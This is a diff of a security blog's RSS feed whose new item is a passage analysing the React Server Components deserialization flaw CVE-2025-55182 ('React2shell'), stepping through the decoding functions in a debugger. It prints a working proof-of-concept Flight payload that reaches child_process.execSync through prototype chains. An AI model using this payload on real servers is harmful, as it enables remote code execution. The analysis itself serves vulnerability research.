@@ -1,4 +1,1115 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVEs on B5juan's Blog</title><link>https://example.com/tags/cves/</link><description>Recent content in CVEs on B5juan's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>B5juan's Blog</copyright><lastBuildDate>Thu, 16 Oct 2025 15:01:26 +0800</lastBuildDate><atom:link href="https://example.com/tags/cves/index.xml" rel="self" type="application/rss+xml"/><item><title>AJ-Report validationRules参数远程代码执行漏洞分析(CVE-2024-7314)</title><link>https://example.com/p/aj-report-validationrules%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-7314/</link><pubDate>Thu, 16 Oct 2025 15:01:26 +0800</pubDate><guid>https://example.com/p/aj-report-validationrules%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-7314/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVEs on B5juan's Blog</title><link>https://example.com/tags/cves/</link><description>Recent content in CVEs on B5juan's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>B5juan's Blog</copyright><lastBuildDate>Wed, 31 Dec 2025 14:15:06 +0800</lastBuildDate><atom:link href="https://example.com/tags/cves/index.xml" rel="self" type="application/rss+xml"/><item><title>React2shell_CVE-2025-55182分析</title><link>https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/</link><pubDate>Wed, 31 Dec 2025 14:15:06 +0800</pubDate><guid>https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5.jpg" alt="Featured image of post React2shell_CVE-2025-55182分析" /&gt;&lt;h2 id="0x01-漏洞背景"&gt;0x01 漏洞背景
+&lt;/h2&gt;&lt;h3 id="11-react-server-component"&gt;1.1 React Server Component
+&lt;/h3&gt;&lt;p&gt;React Server Components 是 React 团队在 React 18 实验阶段提出、在 React 19 稳定的新特性。&lt;/p&gt;
+&lt;p&gt;简单来讲，RSC 把组件分为&lt;code&gt;Server Component&lt;/code&gt; 和 &lt;code&gt;Client Component&lt;/code&gt; 两类，所有的传统组件都是 &lt;code&gt;Client Component&lt;/code&gt;，&lt;code&gt;Server Component&lt;/code&gt; 和前者的区别在于它在服务端而非浏览器端渲染。&lt;/p&gt;
+&lt;p&gt;在服务端，&lt;code&gt;Server Component&lt;/code&gt; 可以运行复杂逻辑，可以通过网络通信、文件操作等方式直接访问数据源，也可以重复利用重型代码，如各种重量级的包。通过这些特性，RSC 实现了更快的页面加载、更小的 JavaScript 打包大小、更好的用户体验。&lt;/p&gt;
+&lt;h3 id="12-flight-协议"&gt;1.2 Flight 协议
+&lt;/h3&gt;&lt;p&gt;Flight 是 RSC 的核心通信协议，用于在服务器与客户端之间传输组件树信息与渲染指令。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工作流程&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务端渲染 RSC，生成组件树的 Flight 流（含类型标记、ID、负载数据）发送给客户端；客户端接收 Flight 流后，解码并重建组件树，与本地客户端组件拼接渲染。&lt;/li&gt;
+&lt;li&gt;客户端触发 Server Action 时，将调用信息编码为 Flight Reply 发送至服务端，服务端解析、执行后返回结果。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="0x02-漏洞原理"&gt;0x02 漏洞原理
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;概念&lt;/strong&gt;：服务端处理 Flight Reply 时，是通过 &lt;code&gt;decodeReply&lt;/code&gt; / &lt;code&gt;decodeReplyFromBusboy&lt;/code&gt; 函数把来自客户端的 Flight 流反序列化成对应的对象/函数。在这个过程中，React 对于客户端数据没有足够的检验和限制，致使漏洞存在。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用&lt;/strong&gt;：伪造一个恶意 Chunk 对象，在反序列化过程中触发恶意代码。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;「Chunk 对象」是 RSC 协议里最小的“数据块＋状态机”单位：
+每行 Flight 流对应一个带 ID 的 Chunk，内部标记 PENDING → RESOLVED → INITIALIZED；服务端边渲染边 flush，客户端收到即按 ID 解析，可独立渲染或等待依赖，实现流式、渐进、可回溯的组件输出。（来自Kimi）&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id="0x03-poc-调试"&gt;0x03 POC 调试
+&lt;/h2&gt;&lt;h3 id="31-环境准备"&gt;3.1 环境准备
+&lt;/h3&gt;&lt;p&gt;自定义一个简单 Server，使用底层库 &lt;code&gt;busboy&lt;/code&gt; 处理传入数据，然后直接把 Busboy 流传入 &lt;code&gt;decodeReplyFromBusboy()&lt;/code&gt;函数处理。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3.png"
+width="627"
+height="408"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3_hu_88ea942ea484f474.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3_hu_df773e9cbb82b2a2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="153"
+data-flex-basis="368px"
+&gt;&lt;/p&gt;
+&lt;p&gt;payload 示例：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2.png"
+width="1055"
+height="389"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2_hu_af42d1dfe58d829e.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2_hu_156d1a7d360573ee.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="271"
+data-flex-basis="650px"
+&gt;&lt;/p&gt;
+&lt;h3 id="32-注册事件构造初始对象"&gt;3.2 注册事件+构造初始对象
+&lt;/h3&gt;&lt;p&gt;先跟进&lt;code&gt;decodeReplyFromBusboy()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy.png"
+width="875"
+height="593"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_hu_17218a762f6bf2f8.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_hu_e705c97fe5a0a913.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="354px"
+&gt;&lt;/p&gt;
+&lt;p&gt;函数接收上述 &lt;code&gt;busbuoyStream&lt;/code&gt; 和两个 undefined 值作为参数，并以此为基础通过 &lt;code&gt;createResponse()&lt;/code&gt; 函数构建出如下&lt;code&gt;response&lt;/code&gt;对象。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2.png"
+width="873"
+height="483"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2_hu_7a417172695c9c78.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2_hu_754985c5d3261db1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="433px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// response
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_bundlerConfig:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_prefix:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_formData:&lt;/span&gt; &lt;span class="err"&gt;FormData&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_chunks:&lt;/span&gt; &lt;span class="err"&gt;Map(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="err"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closed:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closedReason:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_temporaryReferences:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后为 &lt;code&gt;busbuoyStream&lt;/code&gt; 添加三个监听事件，这里只关注 “field” 事件即可。注册完毕之后返回一个由&lt;code&gt;getChunk()&lt;/code&gt;函数构建的 &lt;code&gt;Chunk&lt;/code&gt; 对象。跟进&lt;code&gt;getChunk()&lt;/code&gt;函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2.png"
+width="651"
+height="489"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2_hu_5fbb00bdc9a0b167.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2_hu_aa2d76ec73676cd7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="319px"
+&gt;&lt;/p&gt;
+&lt;p&gt;最终返回如下 Chunk 对象：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// _chunks[0]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;status:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;pending&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="err"&gt;null,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reason:&lt;/span&gt; &lt;span class="err"&gt;null,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_response:&lt;/span&gt; &lt;span class="err"&gt;${response&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;由于引用的特性，在该 &lt;code&gt;Chunk&lt;/code&gt; 对象包含一个值为变量 &lt;code&gt;response&lt;/code&gt; 的_response属性的同时，该 &lt;code&gt;Chunk&lt;/code&gt; 对象也被放入了 &lt;code&gt;response&lt;/code&gt; 变量的_chunks 属性中，对应的 key 是传入的固定数值 &lt;code&gt;0&lt;/code&gt;。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;回到 Server，此时把请求数据推给 &lt;code&gt;busboyStream&lt;/code&gt;，再 await 调用上述 &lt;code&gt;Chunk&lt;/code&gt; 实例。&lt;/p&gt;
+&lt;h3 id="33-解析请求数据"&gt;3.3 解析请求数据
+&lt;/h3&gt;&lt;p&gt;第一次触发 “filed” 事件，上述 &lt;code&gt;response&lt;/code&gt; 和请求数据中第一个键值对传入 &lt;code&gt;resolveField()&lt;/code&gt;函数，跟进该函数。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2.png"
+width="1073"
+height="393"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2_hu_dbc57fa0693bd387.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2_hu_8f7c423e081a779e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="273"
+data-flex-basis="655px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;resolveField()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField.png"
+width="1049"
+height="245"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_hu_e58ea9da5cea298a.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_hu_770ab24d5c8d9056.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="428"
+data-flex-basis="1027px"
+&gt;&lt;/p&gt;
+&lt;p&gt;进入函数体，&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;先为 &lt;code&gt;response&lt;/code&gt; 对象的_formData属性添加上述键值对作为其第1个元素。&lt;/li&gt;
+&lt;li&gt;经过绝对成立的条件判断后，&lt;code&gt;response&lt;/code&gt; 对象被重新赋值为自身的_chunks 属性（唯一元素值为上述 &lt;code&gt;_chunks[0]&lt;/code&gt;对象的 Map实例）&lt;/li&gt;
+&lt;li&gt;局部变量 &lt;code&gt;prefix&lt;/code&gt; 被重新赋值为上述 &lt;code&gt;_chunks[0]&lt;/code&gt; 对象，随上述请求数据中的键值对传入&lt;code&gt;resolveModelChunk()&lt;/code&gt;函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;resolveModelChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk.png"
+width="987"
+height="397"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk_hu_bfa53282336630bf.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk_hu_fba38e2e208babe1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="248"
+data-flex-basis="596px"
+&gt;&lt;/p&gt;
+&lt;p&gt;跟进&lt;code&gt;resolveModelChunk()&lt;/code&gt;函数：经过几个条件判断语句，最终上述&lt;code&gt;_chunks[0]&lt;/code&gt;对象 status 属性被重新赋值为&amp;quot; resolved_model&amp;quot;，value 属性被赋值为请求中的 payload，reason 属性被赋值为上述 payload 对应的键名 “0”。&lt;/p&gt;
+&lt;p&gt;第1个请求数据字段对应的 &lt;code&gt;Chunk&lt;/code&gt; 对象 &lt;code&gt;_chunks[0]&lt;/code&gt;已经构建完成。&lt;/p&gt;
+&lt;hr style="border:1px dashed #ccc;"/&gt;
+&lt;p&gt;继续运行，“filed” 事件再次触发，上述 &lt;code&gt;response&lt;/code&gt; 和请求数据中第2个键值对传入 &lt;code&gt;resolveField()&lt;/code&gt;函数，继续跟进。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3.png"
+width="1158"
+height="436"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3_hu_3b611ef95fe0fe95.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3_hu_789a963a9a85eecf.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="265"
+data-flex-basis="637px"
+&gt;&lt;/p&gt;
+&lt;p&gt;还是进入 &lt;strong&gt;resolveField()&lt;/strong&gt; 函数，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2.png"
+width="1167"
+height="361"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2_hu_e9ea1554171c1d79.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2_hu_4bbb4fa8a9145cad.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="323"
+data-flex-basis="775px"
+&gt;&lt;/p&gt;
+&lt;p&gt;与上一轮相同：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;为 &lt;code&gt;response&lt;/code&gt; 对象的 _formData 属性添加上述键值对作为其第2个元素。&lt;/li&gt;
+&lt;li&gt;经过绝对成立的条件判断后，&lt;code&gt;response&lt;/code&gt; 对象被重新赋值为自身的 _chunks 属性（唯一元素值为上述 &lt;code&gt;_chunks[0]&lt;/code&gt; 对象的 Map实例）&lt;/li&gt;
+&lt;li&gt;因为 response (_chunks)只有一个元素且键是数字 0，所以根据值为 1 的 key 变量取值返回 undefined，跳过&lt;code&gt;resolveModelChunk()&lt;/code&gt;函数调用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;此时，实际只有一个 Chunk 对象被构建，response 对象的 _formData 属性存储了两个字段。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// _chunks[0]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;status:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;{\&amp;#34;then\&amp;#34;:\&amp;#34;$1:__proto__:then\&amp;#34;,\&amp;#34;status\&amp;#34;:\&amp;#34;resolved_model\&amp;#34;,\&amp;#34;reason\&amp;#34;:0,\&amp;#34;value\&amp;#34;:\&amp;#34;{\\\&amp;#34;then\\\&amp;#34;:\\\&amp;#34;$B\\\&amp;#34;}\&amp;#34;,\&amp;#34;_response\&amp;#34;:{\&amp;#34;_prefix\&amp;#34;:\&amp;#34;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;open -a Calculator&amp;#39;);\&amp;#34;,\&amp;#34;_formData\&amp;#34;:{\&amp;#34;get\&amp;#34;:\&amp;#34;$1:constructor:constructor\&amp;#34;}}}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reason:&lt;/span&gt; &lt;span class="err"&gt;0,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_response:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_bundlerConfig:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_prefix:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_formData:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;Symbol:&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;{name:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;0&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;#34;then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;#34;status&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;resolve…mData&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;#34;get&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;$1:constructor:constructor&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="err"&gt;}&amp;#39;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;name:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;1&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;#34;$@abc&amp;#34;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_chunks:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;0:&lt;/span&gt; &lt;span class="err"&gt;$Chunk&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closed:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_closedReason:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_temporaryReferences:&lt;/span&gt; &lt;span class="err"&gt;undefined,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="err"&gt;Prototype&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;Promise,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="34-then回调"&gt;3.4 then回调
